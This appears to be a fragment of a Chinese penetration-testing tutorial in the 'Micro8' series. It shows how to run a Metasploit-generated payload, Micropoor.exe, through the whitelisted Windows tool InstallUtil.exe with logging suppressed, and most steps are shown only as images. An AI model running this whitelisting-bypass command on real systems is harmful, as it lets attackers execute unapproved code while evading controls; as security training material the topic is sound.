---
title: 72、基于白名单Installutil.exe执行payload第二季
date: 2019-09-21 19:06:16
comments: true
categories: 
 - Micro8系列
---
...
### 配置攻击机msf：
![](../do/media/dc56fe8b83b82c65150ac6715d296968.jpg)
...
```
![](../do/media/86a0962a09b6e1f14b90d523abc1e0f8.jpg)

**payload：**  
Micropoor.exe  
![](../do/media/380382cb9c51c0a16a3d13b0b023985a.jpg)

**靶机执行：**
```code
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U Micropoor.exe
```
![](../do/media/8e03a632f426c981eaec67817eea1469.jpg)
